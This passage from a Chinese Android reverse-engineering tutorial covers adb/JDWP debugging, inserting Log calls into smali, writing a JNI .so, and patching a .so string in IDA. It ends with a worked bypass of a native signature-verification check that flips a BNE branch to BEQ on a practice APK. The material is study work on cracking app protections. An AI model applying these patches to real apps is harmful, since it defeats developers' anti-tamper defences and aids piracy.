class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb devices</span><br><span class="line">List of devices attached</span><br><span class="line">emulator-5554   device</span><br><span class="line"></span><br><span class="line">C:\Users\dell&gt;adb shell am start -D -n hfdcxy.com.myapplication/hfdcxy.com.myapplication.MainActivity</span><br><span class="line">Starting: Intent &#123; cmp=hfdcxy.com.myapplication/.MainActivity &#125;</span><br></pre></td></tr></table></figure><p>如果显示“’adb’ 不是内部或外部命令，也不是可运行的程序或批处理文件。”请看 <a href="https://www.cnblogs.com/plsmile/p/11172693.html">https://www.cnblogs.com/plsmile/p/11172693.html</a></p><p>执行完第二条adb后，模拟器进入调试页面，记下PID为2160。不要点模拟器任何东西！！</p><img src="/posts/15be101a/%E8%B0%83%E8%AF%95%E9%A1%B5%E9%9D%A2.png" class="" title="调试页面"><p>绑定远程调试窗口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dell&gt;adb forward tcp:8700 jdwp:2160</span><br><span class="line">8700</span><br></pre></td></tr></table></figure><p>回到AS设置断点，Run-&gt;Attch Debugger to Android Process</p><img src="/posts/15be101a/%E4%B8%8B%E6%96%AD.png" class="" title="下断点"><img src="/posts/15be101a/%E4%B8%8B%E6%96%AD2.png" class="" title="下断点"><p>回到模拟器，输入用户名和密码，点击登录。AS停在断点处，看到我们刚才输入的变量。</p><img src="/posts/15be101a/%E6%96%AD%E7%82%B93.png" class="" title="下断点"><p>单步F8，运行F9，与OD一样。可以下多几个断点，看寄存器的值，但需要自己添加想看的寄存器。</p><img src="/posts/15be101a/%E5%AF%84%E5%AD%98%E5%99%A8%E5%80%BC.png" class="" title="寄存器值"><h1 id="5-在smali代码中插入Log"><a href="#5-在smali代码中插入Log" class="headerlink" title="5. 在smali代码中插入Log"></a>5. 在smali代码中插入Log</h1><p>新建一个项目在MainActivity.java里面写一段switch case语句。注意，新建时语言要选择Java。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span></span><br><span class="line">&#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        name = <span class="string">&quot;v5le0n9&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span>(name)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;v5le0n9&quot;</span>:</span><br><span class="line">                Log.i(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;v5le0n9哈哈&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;l30n9ry0n&quot;</span>:</span><br><span class="line">                Log.i(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;l30n9ry0n啦啦&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                Log.i(<span class="string">&quot;Hello&quot;</span>,<span class="string">&quot;没有符合的name值&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击三角符号运行，或Shift+F10，程序被安装到模拟器上。在Logcat查找“hello”，找到对应Log。</p><img src="/posts/15be101a/Log.png" class="" title="Log"><p>要想<code>.apk</code>文件保存在电脑上，按照下图操作。</p><img src="/posts/15be101a/buildapk.jpg" class="" title="build apk"><p>在<code>D:\Java\Android\MyApplication\app\build\intermediates\apk\debug</code>找到<code>.apk</code>文件。拖进AK反编译。点击入口进入MainActivity.smali，分析代码。</p><p>注意，能修改smali文件的前提是smali文件没有丢失，否则修改了也不能编译成功。再注意，为什么我们编写出来的程序放到AK反编译会显示文件已丢失？可能是因为Android Studio2.0+的Instant Run导致的。</p><p>解决方法：关闭Android Stuio的Instant Run：File -&gt; Setting -&gt; Build, Execution，Deployment -&gt; Debugger -&gt; HotSwap ，取消选中，点击OK。点击Build -&gt; APK重新打包。</p><img src="/posts/15be101a/instantrun.png" class="" title="instantrun"><p>结果还是不行！！直接生成release版本的apk试试，build -&gt;  Geberate signed apk -&gt; APK。如果没有keystore则需要创建一个新的。</p><p>创建keystore看 <a href="https://blog.csdn.net/qq_24349695/article/details/78540982">https://blog.csdn.net/qq_24349695/article/details/78540982</a></p><p>在点击finish时又给我抛出错误：<code>Error:Execution failed for task ‘:app:lintVitalRelease’</code>，解决方法：</p><p>在app的build.gradle里的android{}中添加如下代码，然后再次运行Generate Signed Apk。例如： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">android&#123;</span><br><span class="line">    lintOptions &#123;</span><br><span class="line">        checkReleaseBuilds <span class="literal">false</span></span><br><span class="line">        abortOnError <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这次用release版本终于没有丢失smali文件了。已知代码运行出现的Log是<code>:cond_1</code>里面的信息，所以在<code>:cond_1</code>添加我们想看到的信息，保存编译。</p><img src="/posts/15be101a/%E6%B7%BB%E5%8A%A0smali%E4%BB%A3%E7%A0%81.png" class="" title="添加smali代码"><p>AK连上模拟器，因为模拟器之前有我们在AS直接安装的程序，所以先卸载，再编译安装修改过的程序。回到AS就可以看到多了一条Log信息，但AS中的java语言并没有被修改。</p><img src="/posts/15be101a/ASLog.png" class="" title="AS中多了一条Log信息"><p><strong>所以Log有什么用呢？很多情况下插入Log是为了打印出程序中某个变量的值。</strong></p><p>用以下程序完成三个任务：</p><ol><li><p>添加Log打印出fun2,fun3的值 (其实就是函数的返回值)</p></li><li><p>添加Log打印出fun3里面String类型str的值</p></li><li><p>添加Log打印出fun3里面int类型value3的值 </p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        fun1();</span><br><span class="line">        fun2();</span><br><span class="line">        fun3();</span><br><span class="line">        Log.i(<span class="string">&quot;这个值是&quot;</span>,String.valueOf(fun1()));</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fun1</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> Test.value;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">fun2</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">value2</span> <span class="operator">=</span> Test.value2;</span><br><span class="line">        <span class="keyword">return</span> value2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fun3</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Test.str;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Test.str2;</span><br><span class="line">        <span class="type">int</span> <span class="variable">value3</span> <span class="operator">=</span> Test.value3;</span><br><span class="line">        <span class="keyword">return</span> str2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Test.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> <span class="number">888</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="number">777</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="variable">value3</span> <span class="operator">=</span> <span class="number">666</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;www.52pojie.cn&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;码完代码去看东方明珠&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/1.png" class="" title="运行程序"><p>一样release版本拿去AK反编译。</p><p>任务一：添加Log打印出fun2, fun3的值</p><img src="/posts/15be101a/2.png" class="" title="打印fun1的值"><p><code>.line 17</code>是执行Log代码的内容，有趣的是在AS中<code>Log.i(&quot;这个值是&quot;,String.valueOf(fun1()));</code>刚好是第17行。</p><p>由于fun2和fun1的返回值类型一致，所以可直接复制这些代码，区别只是将fun1改为fun2。</p><img src="/posts/15be101a/3.png" class="" title="返回fun2的值"><p>fun2和fun3函数都是int类型，通过<code>String.valueOf</code>这个函数转换成的String类型。但是fun3这个函数本身就是String类型，这里如果还通过<code>String.valueOf</code>函数转换的话程序会报错。所以将执行<code>String.valueOf</code>的代码去掉即可。</p><img src="/posts/15be101a/4.png" class="" title="返回fun3的值"><p>保存-&gt;卸载-&gt;编译-&gt;安装。</p><img src="/posts/15be101a/5.png" class="" title="Log显示fun1,fun2,fun3返回值"><p>任务二：添加Log打印出fun3里面String类型str的值</p><img src="/posts/15be101a/6.png" class="" title="fun3中的smali代码"><p>翻译一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">fun3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> str;</span><br><span class="line"><span class="type">String</span> <span class="variable">v0</span> <span class="operator">=</span> str2;</span><br><span class="line"><span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> value3;</span><br><span class="line"><span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即str的值被str2覆盖了，所以可以直接删掉<code>.line 33</code>代码。</p><img src="/posts/15be101a/7.png" class="" title="注释33行代码"><img src="/posts/15be101a/8.png" class="" title="显示str的值"><p>任务三：添加Log打印出fun3里面int类型value3的值 </p><p>将fun3的smali代码按照fun2的smali代码修改返回值类型。</p><img src="/posts/15be101a/9.png" class="" title="修改返回值类型"><img src="/posts/15be101a/11.png" class="" title="修改返回值类型"><p>最后还要添加修改Log处的代码。</p><img src="/posts/15be101a/10.png" class="" title="修改返回值类型"><img src="/posts/15be101a/12.png" class="" title="显示value3的值"><h1 id="6-编写第一个so"><a href="#6-编写第一个so" class="headerlink" title="6. 编写第一个so"></a>6. 编写第一个so</h1><p>Android开发中，我们经常会用到<code>.so</code>文件。原因有很多，比如部分方法不想暴露，如加密规则。比如部分秘钥需要存储，哪怕最简单的一个String我们使用.so调用获取这个String，也比直接明文写在代码中要来的安全。那么逆向破解也是一样， 为了避免以后破解so时知其然而不知其所以然，要破解一个so就得先学习这个so是怎么编写的。</p><p>生成so文件需要NDK，由于本人安装NDK安装得太混乱了，出了各种各种的问题最后莫名其妙就成功了，所以以下步骤仅供参考，如果发现错误及时百度。</p><p>创建一个native C++项目，一路next。</p><img src="/posts/15be101a/C++.png" class="" title="C++"><p>创建项目时会自动下载NDK，所以不用管。及时看build窗口信息，问题或异常会在build窗口显示。可以看到在<code>D:\Java\Android\sdk\ndk\21.4.7075529</code>就下载好了ndk的21.4版本。</p><p>打开Project的<code>local.properties</code>文件添加NDK路径。</p><img src="/posts/15be101a/%E9%85%8D%E7%BD%AEDNK.png" class="" title="配置NDK"><p>此时，可以在 File -&gt; Project Structure -&gt; SDK Location 就可以看到NDK路径了，说明NDK已经安装好并且能用了。</p><img src="/posts/15be101a/%E9%85%8D%E7%BD%AENDK.png" class="" title="配置NDK"><p>那么现在就可以正式编写so文件了。在<code>MainActivity.java</code>的父目录里新建一个类，命名为<code>myJNI</code>。</p><img src="/posts/15be101a/%E6%96%B0%E5%BB%BA%E7%B1%BB.jpg" class="" title="新建一个类"><p>声明native方法。这个类是java与C/C++交互的中介，方法由java声明，由C/C++实现。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">myJNI</span> &#123;</span><br><span class="line">　　<span class="comment">//加载so库</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;JniTest&quot;</span>);<span class="comment">//so库名字</span></span><br><span class="line">    &#125;</span><br><span class="line">　　<span class="comment">//native方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title function_">sayHello</span><span class="params">()</span>;<span class="comment">//在so库里增加sayHello()功能</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在左侧栏右键<code>myJNI.java</code>，复制路径，在AS下面的终端编译<code>myJNI</code>类，生成<code>myJNI.class</code>文件。由于注释出错(?)，所以我把注释去掉了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac D:\Java\Android\MyApplication4\app\src\main\java\com\example\myapplication\myJNI.java</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/%E7%BC%96%E8%AF%91class%E6%96%87%E4%BB%B6.png" class="" title="生成class文件"><p>记住包名为<code>com.example.myapplication</code>，类名为<code>myJNI</code>。在AS终端上去到java目录，生成<code>.h</code>头文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javah -jni com.example.myapplication.myJNI</span><br></pre></td></tr></table></figure><img src="/posts/15be101a/%E7%94%9F%E6%88%90%E5%A4%B4%E6%96%87%E4%BB%B6.png" class="" title="生成头文件"><p>将生成的头文件拖到cpp目录下，并且将<code>native-lib.cpp</code>强制删去。在cpp目录下新建<code>.c</code>文件。</p><img src="/posts/15be101a/%E6%96%B0%E5%BB%BAmain.jpg" class="" title="新建c文件"><p>将文件头包括进来，实现sayHello()方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;com_example_myapplication_myJNI.h&quot;</span></span></span><br><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_com_example_myapplication_myJNI_sayHello</span><span class="params">(JNIEnv *env, jclass jobj)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (*env)-&gt;NewStringUTF(env,<span class="string">&quot;hello 52pojie!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于我们使用CMake来生成so的, 所以要修改<code>CMakeLists.txt</code>来指定so名称和so的源文件的相对路径。点击上方“大象”同步一下。</p><img src="/posts/15be101a/%E4%BF%AE%E6%94%B9%E5%90%8D%E7%A7%B0.png" class="" title="so名称和so的源文件的相对路径"><p>完成以上步骤之后，生成release版本的apk，要不然将来想要修改<code>.so</code>文件后不能在模拟器上运行。</p><p>生成的so在<code>app\build\intermediates\cmake\debug\obj\</code>和<code>app\build\intermediates\merged_native_libs\debug\out\lib</code>和<code>app\build\intermediates\stripped_native_libs\debug\out\lib\</code>。为什么相同的东西要分别放在三个地方，不懂。随便一个目录看看：</p><img src="/posts/15be101a/jniso.png" class="" title="libjnitest.so"><p>发现这几个目录里面都有<code>libJniTest.so</code>，不同处理器使用的文件不一样。雷电模拟器就是x86架构的。</p><ul><li>armeabi-v7a: 第7代及以上的 ARM 处理器。2011年15月以后的生产的大部分Android设备都使用它。</li><li>arm64-v8a: 第8代、64位ARM处理器，很少设备，三星 Galaxy S6是其中之一。</li><li>armeabi: 第5代、第6代的ARM处理器，早期的手机用的比较多。</li><li>x86: 平板、模拟器用得比较多。</li><li><p>x86_64: 64位的平板。</p><p>在<code>app/src/main</code>下新建<code>jnilib</code>目录, 并将生成的SO文件拷贝到该文件夹下。</p></li></ul><img src="/posts/15be101a/%E6%8B%B7%E8%B4%9Dso.png" class="" title="SO文件拷贝到该文件夹下"><p>打开<code>MainActivity.java</code>插入一条log来调用so中的<code>sayHello</code>方法，并连接模拟器调试。</p><img src="/posts/15be101a/sayhello.png" class="" title="插入一条log"><img src="/posts/15be101a/52pj.png" class="" title="插入一条log"><h1 id="7-IDA破解第一个so"><a href="#7-IDA破解第一个so" class="headerlink" title="7. IDA破解第一个so"></a>7. IDA破解第一个so</h1><h2 id="7-1-预备知识与环境配置"><a href="#7-1-预备知识与环境配置" class="headerlink" title="7.1 预备知识与环境配置"></a>7.1 预备知识与环境配置</h2><p>下载最新版<code>apktool.jar</code>和<code>apktool.bat</code>一起放到<code>C:\Windows</code>目录下，不想下载也可以在AK目录下找到它们，大概在<code>D:\Java\AndroidKiller_v1.3.1\bin\apktool</code>，再放到<code>C:\Windows</code>。不想放到<code>C:\Windows</code>也可以把环境变量设到上面路径中，随你喜欢。反正最后的结果是可以在命令窗口使用apktool。记住两个关键命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d test.apk<span class="comment">//解包</span></span><br><span class="line">apktool b test<span class="comment">//重打包</span></span><br></pre></td></tr></table></figure><img src="/posts/15be101a/%E8%A7%A3%E5%8C%85.png" class="" title="解包"><img src="/posts/15be101a/%E9%87%8D%E6%89%93%E5%8C%85.png" class="" title="重打包"><p>重打包后的apk由于没有签名，所以这里需要对重打包后的apk进行签名后才能在手机上安装并运行。打开AK，工具-&gt;APK签名，将要签名的apk拖拉到软件中进行签名，点执行后将会在当前目录生成<code>hello_sign.apk</code>。</p><img src="/posts/15be101a/%E7%AD%BE%E5%90%8D.png" class="" title="签名"><h2 id="7-2-破解so文件"><a href="#7-2-破解so文件" class="headerlink" title="7.2 破解so文件"></a>7.2 破解so文件</h2><p>打开AS，在<code>Logcat</code>模块连接好模拟器，将<code>.apk</code>文件安装到模拟器上，运行<code>.apk</code>，回到<code>Logcat</code>搜索“52pojie”。</p><img src="/posts/15be101a/52pojie.png" class="" title="调用sayhello方法"><p>我们的目的是修改这句话。</p><p>在主机上将<code>.apk</code>解包后，进入lib目录，发现有4个目录。</p><img src="/posts/15be101a/lib.png" class="" title="lib目录"><p>那我们用IDA(这里用IDAv6.6，因为IDAv7.0没有<code>modifyfile</code>插件)打开<code>x86</code>目录下的so文件，Shift + F12打开字符串窗口，Ctrl + F 查找“52pojie”，双击进入找到其内存地址。</p><img src="/posts/15be101a/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80.png" class="" title="52pojie内存地址"><p>选中字符串，按照下图操作去到十六进制视图。</p><p>将我们想写入的内容转换为十六进制。</p><img src="/posts/15be101a/16%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2.png" class="" title="转换为16进制"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68 65 6c 6c 6f 20 76 35 6c 65 30 6e 39</span><br></pre></td></tr></table></figure><p>回到IDA，选中需要修改的首字节右键-&gt;Edit。</p><img src="/posts/15be101a/16%E8%BF%9B%E5%88%B6%E7%BC%96%E8%BE%91.png" class="" title="编辑字符串"><p>修改好，再次右键-&gt;Apply changes。</p><p>Edit -&gt; Plugins -&gt; modifyfile -&gt; 确认更改。另存到某处。</p><img src="/posts/15be101a/modifyfile.jpg" class="" title="modifyfile"><p>如果lib目录中有多种模式，如果修改32位<code>.so</code>则把所有32位处理器目录下的<code>.so</code>都更换为新的<code>.so</code>文件，64位同理。我们只修改的是32位的，所以只要在<code>x86</code>目录下替换即可。</p><p>重新打包并签名。安装在模拟器上，运行。</p><img src="/posts/15be101a/so.png" class="" title="修改so文件成功"><h1 id="8-IDA爆破签名验证-IDA静态分析"><a href="#8-IDA爆破签名验证-IDA静态分析" class="headerlink" title="8. IDA爆破签名验证(IDA静态分析)"></a>8. IDA爆破签名验证(IDA静态分析)</h1><p>我发现会飞的丑小鸭特别油麦，下面是他为了引出主题写的一个场景，我觉得特别逗就拿过来给你们看看。</p><blockquote><p>李华是一个很有天赋 的Android程序员 他用了半年时间含辛茹苦，挑灯夜战，摧枯拉朽的编写了一款黑宝宝游戏。当然这几个词形容的并不恰当，但是李华确实为了这个apk的上线付出了很多努力。谁知游戏刚一上线就被破解了，生不生气？难不难过？</p><p>吸取了这次的教训，李华决定要反击。他通过书籍了解到一个apk只有一个签名，于是他有了一个很大胆的想法：如果别人要破解我的apk，他一定会对我的apk进行重打包，但是重打包后的签名就不是我原来的签名了，我可以在代码中判断，如果签名不是我的签名，那么就让程序退出。这样不就达到防止别人破解的目的了，哈哈哈，太佩服我自己了。</p><p>他知道你最近在学习Android逆向，他想在游戏上线前让你测试一下他新加的签名验证是否能防住别人的破解。<br>下面是李华编写的黑宝宝apk<br>链接：<a href="https://pan.baidu.com/s/1h6pX2ARE3qtiKiYbcnJ-3g">https://pan.baidu.com/s/1h6pX2ARE3qtiKiYbcnJ-3g</a> 密码：duv5</p><p>你拿到这个apk直接反编译重打包后安装到手机上，刚一运行程序就退出，你懵了，明明我什么都没改！接着看了一会反编译后的代码说：他的签名验证是写在so里面的，但是我不会so的破解，大哥你教教我吧！</p><p>我说：好吧！</p><p>下面开始本节课的课程，请同学们认真听课。</p></blockquote><p>用apktool解包apk后将项目载入AS，在<code>myJNI.smali</code>里有<code>check</code>函数，应该就是验证签名是否一致的函数。</p><img src="/posts/15be101a/check.png" class="" title="check函数"><p>将<code>libJniTest.so</code>载入IDA，需要注意的是，IDA众多窗口中，有两个窗口与so有关：Exports窗口是导出表，能让外部调用so中的函数；Imports窗口是导入表，能让so调用外部的函数。所以根据上面的信息，so里有check函数，所以check可以被外部调用，应该在导出表里找check函数。</p><img src="/posts/15be101a/exports.png" class="" title="导出表"><p>双击进去到汇编代码，F5进入反汇编代码。谁能想到<code>armeabi</code>目录下的<code>.so</code>文件需要IDA32才能反编译呢，果断把文件载入IDA32。</p><p>以下两种情况是根据不同版本的IDA对so文件修改的处理。</p><h2 id="IDAv7-0"><a href="#IDAv7-0" class="headerlink" title="IDAv7.0+"></a>IDAv7.0+</h2><p>去到反汇编代码后，看到很多字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。</p><img src="/posts/15be101a/print.png" class="" title="导出表"><p>先进去<code>unk_223C</code>看看里面是什么。好吧，就算16进制转文本也翻译不出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4A 4E 49 E8 8E B7 E5 8F 96 E5 88 B0 E7 9A 84 E7 AD BE E5 </span><br><span class="line">J  N  I</span><br><span class="line">90 8D E6 98 AF 25 73</span><br><span class="line">    %  s</span><br></pre></td></tr></table></figure><p>那就在模拟器运行一下用AS获取Log吧。</p><img src="/posts/15be101a/%E8%8E%B7%E5%8F%96%E7%AD%BE%E5%90%8D.png" class="" title="出现Log"><p>再拿去16进制转文本，这跟上面的16进制代码有半毛钱关系吗？！这里我真不知道怎么回事，哪位大牛来告诉我。</p><img src="/posts/15be101a/16%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%96%87%E6%9C%AC.png" class="" title="16进制转文本"><p>已知那一大串数字是签名，如果v9与字符串一致，则跳到<code>unk_261A</code>显示“签名一致”，那<code>unk_262E</code>自然就是“签名不一致”，退出程序。我们破解的思路是，就算v9与字符串不一致，也要让它跳到<code>unk_261A</code>去。</p><p>回到汇编视图，在左侧的函数窗口找到<code>check</code>函数双击来到图形化窗口，找到关键跳转。</p><img src="/posts/15be101a/%E6%B1%87%E7%BC%96.png" class="" title="关键跳转"><p>BNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。<br>BEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。</p><p>所以我们把<code>BNE</code>修改为<code>BEQ</code>即可。<code>BNE</code>的机器码为<code>D1</code>，<code>BEQ</code>的机器码为<code>D0</code>。按照下图操作修改机器码。</p><img src="/posts/15be101a/%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82.jpg" class="" title="修改字节"><p>修改完后保存so文件。</p><img src="/posts/15be101a/%E4%BF%9D%E5%AD%98so%E6%96%87%E4%BB%B6.jpg" class="" title="保存so文件"><img src="/posts/15be101a/bak.png" class="" title="保存备份"><p>把<code>armeabi</code>和<code>armeabi-v7a</code>下的<code>libJniTest.so</code>替换成修改后的so，再删掉<code>x86</code>目录。打包签名。</p><p>这里为什么要删掉<code>x86</code>目录，可能是因为雷电模拟器是x86架构的，它默认使用<code>x86</code>目录下的<code>libJniTest.so</code>，所以删掉才有可能使用<code>armeabi</code>或<code>armeabi-v7a</code>目录下的<code>libJniTest.so</code>。</p><h2 id="IDAv6-6"><a href="#IDAv6-6" class="headerlink" title="IDAv6.6"></a>IDAv6.6</h2><p>去到反汇编代码后，看到一条很长的字符串，暂时我们还不知道有什么用，但我们熟悉Log，下面这三条应该是输出Log语句。</p><img src="/posts/15be101a/%E5%AD%97%E7%AC%A6%E4%B8%B2.png" class="" title="Log语句"><p>由于中文乱码，所以设置编码为UTF-8，Options -&gt;  ASCII string style -&gt; Set default encodings -&gt; 8-bit… -&gt; Change -&gt; UTF-8 -&gt; OK。</p><img src="/posts/15be101a/string.png" class="" title="设置编码"><p>F5重新反编译一下，乱码问题解决。</p><img src="/posts/15be101a/%E8%A7%A3%E5%86%B3%E4%B9%B1%E7%A0%81.png" class="" title="解决编码"><p>分析一下程序流程，<code>getSignature</code>是获取程序签名，获取的签名与那一长串比较，如果相等则“签名一致”。破解的思路是即使获取的签名与存储的签名不一致，也可以让程序跳到“签名一致”处，本质就是修改跳转指令。</p><p>回到汇编视图，在左侧的函数窗口找到<code>check</code>函数双击，按空格来到图形化窗口，找到关键跳转。</p><img src="/posts/15be101a/%E8%B7%B3%E8%BD%AC.png" class="" title="关键跳转"><p>BNE：数据跳转指令，标志寄存器中Z标志位不等于零时, 跳转到BNE后标签处。<br>BEQ：数据跳转指令，标志寄存器中Z标志位等于零时, 跳转到BEQ后标签处。</p><p>所以我们把<code>BNE</code>修改为<code>BEQ</code>即可。<code>BNE</code>的机器码为<code>D1</code>，<code>BEQ</code>的机器码为<code>D0</code>。老方法，去到hex dump处修改十六进制代码。保存so文件，删掉<code>x86</code>目录，打包签名。</p><h1 id="9-IDA动态破解登录验证"><a 